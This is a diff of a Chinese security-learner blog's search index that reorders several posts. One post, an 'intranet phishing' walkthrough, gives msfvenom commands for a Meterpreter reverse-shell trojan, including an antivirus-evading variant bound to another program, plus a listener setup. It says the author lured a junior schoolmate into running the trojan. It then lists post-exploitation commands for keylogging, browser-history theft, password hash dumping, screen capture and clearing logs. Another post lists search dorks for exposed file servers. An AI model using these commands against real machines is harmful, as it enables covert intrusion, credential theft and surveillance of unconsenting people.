+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1>本博客搭建时间为2020.01.01</h1>
+
+<p>By xiaochen</p>
+<div class="tabs" id="test3"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test3-1">关于作者</button></li><li class="tab"><button type="button" data-href="#test3-2">关于博客</button></li><li class="tab"><button type="button" data-href="#test3-3">联系作者</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test3-1"><p><strong>一个正在上岸的网安萌新</strong></p><button type="button" class="tab-to-top" onclick="scrollToDest($(this).parents('.tabs'),65)"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-2"><p><strong>本站用于记录本人成长日记，以及分享一些杂七杂八的知识和学习资源.</strong></p>
+<p><strong>分享网络安全相关的文章以及学习资料</strong></p>
+<p><strong>本站内容同步至<a href="https://hixiaochen.gitee.io/" title="My Gitee">Gitee</a></strong></p>
+<p>其他博客文章<a href="https://blog.csdn.net/oo798" title="My CSDN">CSDN</a> ||<a href="https://www.cnblogs.com/hixiaochen/" title="My Blog garden">博客园</a></p><button type="button" class="tab-to-top" onclick="scrollToDest($(this).parents('.tabs'),65)"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-3"><p><strong>QQ:488675848.</strong><br><strong>email:<a href="mailto:&#52;&#x38;&#x38;&#x36;&#55;&#53;&#x38;&#x34;&#56;&#x40;&#113;&#113;&#x2e;&#99;&#x6f;&#109;">&#52;&#x38;&#x38;&#x36;&#55;&#53;&#x38;&#x34;&#56;&#x40;&#113;&#113;&#x2e;&#99;&#x6f;&#109;</a></strong></p><button type="button" class="tab-to-top" onclick="scrollToDest($(this).parents('.tabs'),65)"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+<hr>]]></content>
   </entry>
   <entry>
     <title>信息收集之nmap</title>
@@ -165,19 +196,6 @@
       </tags>
   </entry>
   <entry>
-    <title>关于本博客</title>
-    <url>/post/4a17b156/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1>本博客搭建时间为2020.01.01</h1>
-
-<p>By xiaochen</p>
-<div class="tabs" id="test3"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test3-1">关于作者</button></li><li class="tab"><button type="button" data-href="#test3-2">关于博客</button></li><li class="tab"><button type="button" data-href="#test3-3">联系作者</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test3-1"><p><strong>一个正在上岸的网安萌新</strong></p><button type="button" class="tab-to-top" onclick="scrollToDest($(this).parents('.tabs'),65)"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-2"><p><strong>本站用于记录本人成长日记，以及分享一些杂七杂八的知识和学习资源.</strong></p>
-<p><strong>分享网络安全相关的文章以及学习资料</strong></p>
-<p><strong>本站内容同步至<a href="https://hixiaochen.gitee.io/" title="My Gitee">Gitee</a></strong></p>
-<p>其他博客文章<a href="https://blog.csdn.net/oo798" title="My CSDN">CSDN</a> ||<a href="https://www.cnblogs.com/hixiaochen/" title="My Blog garden">博客园</a></p><button type="button" class="tab-to-top" onclick="scrollToDest($(this).parents('.tabs'),65)"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-3"><p><strong>QQ:488675848.</strong><br><strong>email:<a href="mailto:&#x34;&#56;&#x38;&#x36;&#55;&#53;&#x38;&#52;&#56;&#x40;&#x71;&#113;&#x2e;&#99;&#x6f;&#x6d;">&#x34;&#56;&#x38;&#x36;&#55;&#53;&#x38;&#52;&#56;&#x40;&#x71;&#113;&#x2e;&#99;&#x6f;&#x6d;</a></strong></p><button type="button" class="tab-to-top" onclick="scrollToDest($(this).parents('.tabs'),65)"><i class="fas fa-arrow-up"></i></button></div></div></div>
-
-<hr>]]></content>
-  </entry>
-  <entry>
     <title>宝塔面板紧急安全更新</title>
     <url>/post/597aaa43/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2020.8.23晚宝塔面板紧急更新</p>
@@ -203,69 +221,19 @@
       </tags>
   </entry>
   <entry>
-    <title>渗透外网之钓鱼篇</title>
-    <url>/post/f65a2643/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="步骤思路"><a href="#步骤思路" class="headerlink" title="步骤思路"></a>步骤思路</h2><p>- </p>
-]]></content>
-  </entry>
-  <entry>
-    <title>内网渗透之钓鱼篇</title>
-    <url>/post/40a967b4/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>emmm…这个原因就不说了哈哈 懂得都懂</p>
-<p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atMGTI.gif"></p>
-<h2 id="渗透内网"><a href="#渗透内网" class="headerlink" title="渗透内网"></a>渗透内网</h2><p>渗透内网指的是在</p>
-<h1 id="0x02-准备环境"><a href="#0x02-准备环境" class="headerlink" title="0x02 准备环境"></a>0x02 准备环境</h1><p>攻击机：kali</p>
-<p>靶机：学弟的Pc</p>
-<h2 id="开始制作木马"><a href="#开始制作木马" class="headerlink" title="开始制作木马"></a>开始制作木马</h2><p>裸奔木马</p>
-<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.18.9.70 LPORT=3333 -f exe &gt; /root/test.exe</code></p>
-<p>免杀木马</p>
-<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.18.9.70 LPORT=3333 -e x86/shikata_ga_nai -x caidao.exe -i 12 -f exe -o /var/www/html/caidao.exe</code></p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th align="center">备注</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>-e</td>
-<td align="center">指定编码方式对攻击载荷进行重新编译</td>
-</tr>
-<tr>
-<td>-x</td>
-<td align="center">指定木马捆绑在哪个可执行程序模版上</td>
-</tr>
-<tr>
-<td>-i</td>
-<td align="center">指定对目标编码的次数，多次编码理论上来讲有助于免杀</td>
-</tr>
-<tr>
-<td>-f</td>
-<td align="center">指定MSF编码器输出的程序格式</td>
-</tr>
-<tr>
-<td>-o</td>
-<td align="center">指定处理完毕后的文件输出路径</td>
-</tr>
-</tbody></table>
-<p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atM80A.png"></p>
-<p>把木马放到html下</p>
-<p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atMlOH.png"></p>
-<h2 id="运行msf监听模块"><a href="#运行msf监听模块" class="headerlink" title="运行msf监听模块"></a>运行msf监听模块</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;shell_reverse_tcp</span><br><span class="line">set LHOST 172.18.9.70</span><br><span class="line">set LPORT 3333</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x03-开始攻击"><a href="#0x03-开始攻击" class="headerlink" title="0x03 开始攻击"></a>0x03 开始攻击</h1><p>首先先诱导学弟点开链接并下载执行木马</p>
-<p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atMQ6e.png"></p>
-<p>当学弟执行木马文件后 获得shell</p>
-<p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atM3md.png"></p>
-<h1 id="0x04-获得shell之后的操作"><a href="#0x04-获得shell之后的操作" class="headerlink" title="0x04 获得shell之后的操作"></a>0x04 获得shell之后的操作</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter下的命令：</span><br><span class="line">getwd 当前目录</span><br><span class="line">dir 查看所有文件</span><br><span class="line">cat c:\123.txt 查看文件123.txt内容（数据是字符串传递，所以加一个转义字符\）</span><br><span class="line">search -f cmd.exe （搜索名为cmd.exe文件所在目录）</span><br><span class="line">upload /root/桌面/backldoor.exe（要上传的文件） -&gt; c:\（上传到的目录） 上传文件</span><br><span class="line">download c:\123txt /root 下载文件</span><br><span class="line">clearev 清除日志</span><br><span class="line">getuid 当前用户</span><br><span class="line">ps 查看所用进程</span><br><span class="line">kill 杀死某个进程</span><br><span class="line">sysinfo 系统信息</span><br><span class="line"></span><br><span class="line">键盘记录</span><br><span class="line">keyscan_start 开始键盘记录</span><br><span class="line">keyscan_dump 查看结果</span><br><span class="line">keyscan_stop</span><br><span class="line"></span><br><span class="line">获取浏览器记录</span><br><span class="line">run post/windows/gather/forensics/browser_history</span><br><span class="line">打开拷贝到本地的文件</span><br><span class="line">/root/.msf4/local/aiyou_Firefox_wqsz7fg5.default-release_places.sqlite</span><br><span class="line">查看记录SELECT url FROM moz_places</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">屏幕截图</span><br><span class="line">screenshot</span><br><span class="line"></span><br><span class="line">屏幕监控</span><br><span class="line">run vnc</span><br><span class="line"></span><br><span class="line">获取密文密码</span><br><span class="line">hashdump</span><br><span class="line"></span><br><span class="line">shell</span><br><span class="line">获取shell，进入cmd</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>学弟：跟人沾边的事你一点都不干</p>
+    <title>无线攻击之aircrack-ng破解无线密码</title>
+    <url>/post/19ad867/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="步骤思路"><a href="#步骤思路" class="headerlink" title="步骤思路"></a>步骤思路</h1><ul>
+<li>环境准备</li>
+<li></li>
+</ul>
+<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>准备USB无线网卡</p>
 ]]></content>
       <categories>
         <category>渗透测试</category>
       </categories>
       <tags>
-        <tag>内网渗透</tag>
+        <tag>破解WiFi</tag>
       </tags>
   </entry>
   <entry>
@@ -329,37 +297,69 @@
       </tags>
   </entry>
   <entry>
-    <title>无线攻击之aircrack-ng破解无线密码</title>
-    <url>/post/19ad867/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="步骤思路"><a href="#步骤思路" class="headerlink" title="步骤思路"></a>步骤思路</h1><ul>
-<li>环境准备</li>
-<li></li>
-</ul>
-<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>准备USB无线网卡</p>
+    <title>内网渗透之钓鱼篇</title>
+    <url>/post/40a967b4/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>emmm…这个原因就不说了哈哈 懂得都懂</p>
+<p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atMGTI.gif"></p>
+<h2 id="渗透内网"><a href="#渗透内网" class="headerlink" title="渗透内网"></a>渗透内网</h2><p>渗透内网指的是在</p>
+<h1 id="0x02-准备环境"><a href="#0x02-准备环境" class="headerlink" title="0x02 准备环境"></a>0x02 准备环境</h1><p>攻击机：kali</p>
+<p>靶机：学弟的Pc</p>
+<h2 id="开始制作木马"><a href="#开始制作木马" class="headerlink" title="开始制作木马"></a>开始制作木马</h2><p>裸奔木马</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.18.9.70 LPORT=3333 -f exe &gt; /root/test.exe</code></p>
+<p>免杀木马</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.18.9.70 LPORT=3333 -e x86/shikata_ga_nai -x caidao.exe -i 12 -f exe -o /var/www/html/caidao.exe</code></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th align="center">备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-e</td>
+<td align="center">指定编码方式对攻击载荷进行重新编译</td>
+</tr>
+<tr>
+<td>-x</td>
+<td align="center">指定木马捆绑在哪个可执行程序模版上</td>
+</tr>
+<tr>
+<td>-i</td>
+<td align="center">指定对目标编码的次数，多次编码理论上来讲有助于免杀</td>
+</tr>
+<tr>
+<td>-f</td>
+<td align="center">指定MSF编码器输出的程序格式</td>
+</tr>
+<tr>
+<td>-o</td>
+<td align="center">指定处理完毕后的文件输出路径</td>
+</tr>
+</tbody></table>
+<p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atM80A.png"></p>
+<p>把木马放到html下</p>
+<p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atMlOH.png"></p>
+<h2 id="运行msf监听模块"><a href="#运行msf监听模块" class="headerlink" title="运行msf监听模块"></a>运行msf监听模块</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;shell_reverse_tcp</span><br><span class="line">set LHOST 172.18.9.70</span><br><span class="line">set LPORT 3333</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x03-开始攻击"><a href="#0x03-开始攻击" class="headerlink" title="0x03 开始攻击"></a>0x03 开始攻击</h1><p>首先先诱导学弟点开链接并下载执行木马</p>
+<p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atMQ6e.png"></p>
+<p>当学弟执行木马文件后 获得shell</p>
+<p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atM3md.png"></p>
+<h1 id="0x04-获得shell之后的操作"><a href="#0x04-获得shell之后的操作" class="headerlink" title="0x04 获得shell之后的操作"></a>0x04 获得shell之后的操作</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter下的命令：</span><br><span class="line">getwd 当前目录</span><br><span class="line">dir 查看所有文件</span><br><span class="line">cat c:\123.txt 查看文件123.txt内容（数据是字符串传递，所以加一个转义字符\）</span><br><span class="line">search -f cmd.exe （搜索名为cmd.exe文件所在目录）</span><br><span class="line">upload /root/桌面/backldoor.exe（要上传的文件） -&gt; c:\（上传到的目录） 上传文件</span><br><span class="line">download c:\123txt /root 下载文件</span><br><span class="line">clearev 清除日志</span><br><span class="line">getuid 当前用户</span><br><span class="line">ps 查看所用进程</span><br><span class="line">kill 杀死某个进程</span><br><span class="line">sysinfo 系统信息</span><br><span class="line"></span><br><span class="line">键盘记录</span><br><span class="line">keyscan_start 开始键盘记录</span><br><span class="line">keyscan_dump 查看结果</span><br><span class="line">keyscan_stop</span><br><span class="line"></span><br><span class="line">获取浏览器记录</span><br><span class="line">run post/windows/gather/forensics/browser_history</span><br><span class="line">打开拷贝到本地的文件</span><br><span class="line">/root/.msf4/local/aiyou_Firefox_wqsz7fg5.default-release_places.sqlite</span><br><span class="line">查看记录SELECT url FROM moz_places</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">屏幕截图</span><br><span class="line">screenshot</span><br><span class="line"></span><br><span class="line">屏幕监控</span><br><span class="line">run vnc</span><br><span class="line"></span><br><span class="line">获取密文密码</span><br><span class="line">hashdump</span><br><span class="line"></span><br><span class="line">shell</span><br><span class="line">获取shell，进入cmd</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>学弟：跟人沾边的事你一点都不干</p>
 ]]></content>
       <categories>
         <category>渗透测试</category>
       </categories>
       <tags>
-        <tag>破解WiFi</tag>
+        <tag>内网渗透</tag>
       </tags>
   </entry>
   <entry>
-    <title>everything 信息泄露</title>
-    <url>/post/39581507/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="everything"><a href="#everything" class="headerlink" title="everything"></a>everything</h1><p>用于快速搜索文件，文件夹。</p>
-<h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><p>当电脑处在公网IP，everything HTTP服务配置不当时导致信息泄露。配置不当指http服务器未设置密码等。<br><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/10/03/03vtSJ.png" alt="imgname"></p>
-<h1 id="Google语法"><a href="#Google语法" class="headerlink" title="Google语法"></a>Google语法</h1><p>allintitle: Everything C:\Windows<br>inurl:Diagnostics/index<br><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/10/03/03xXgH.png" alt="imgname"><br><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/10/03/03xzDI.png" alt="03xzDI.png"><br><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/10/03/03xxKA.png" alt="03xxKA.png"></p>
-<h1 id="安全配置"><a href="#安全配置" class="headerlink" title="安全配置"></a>安全配置</h1><ol>
-<li>关闭http服务</li>
-<li>更换较为复杂账号密码及端口</li>
-</ol>
+    <title>渗透外网之钓鱼篇</title>
+    <url>/post/f65a2643/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="步骤思路"><a href="#步骤思路" class="headerlink" title="步骤思路"></a>步骤思路</h2><p>- </p>
 ]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>信息泄露</tag>
-      </tags>
   </entry>
 </search>
